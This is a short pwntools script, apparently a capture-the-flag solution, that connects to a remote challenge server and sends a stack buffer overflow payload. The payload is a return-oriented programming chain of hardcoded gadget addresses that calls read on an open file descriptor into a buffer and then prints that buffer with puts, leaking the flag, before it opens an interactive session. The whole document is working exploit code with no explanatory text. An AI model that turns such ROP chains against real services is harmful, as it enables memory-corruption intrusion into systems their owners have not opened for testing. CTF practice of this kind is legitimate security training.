from pwn import *

io = remote("nc1.ctfplus.cn", 14555)

padding = 32 + 8

pop_rdi = 0x401303
pop_rsi = 0x401305
pop_rdx = 0x401307

vuln=0x40143F

got_puts = 0x404018

ptl_puts = 0x4010F0
ptl_read = 0x401130

flag_buf = 0x4040E0

payload = (
    b'a' * padding +
    p64(pop_rdi) + p64(4) +
    p64(pop_rsi) + p64(flag_buf) +
    p64(pop_rdx) + p64(0x100) +
    p64(ptl_read) +
    p64(pop_rdi) + p64(flag_buf) +
    p64(ptl_puts)
)

print("[-] payload =", payload)
io.send(payload)

io.interactive()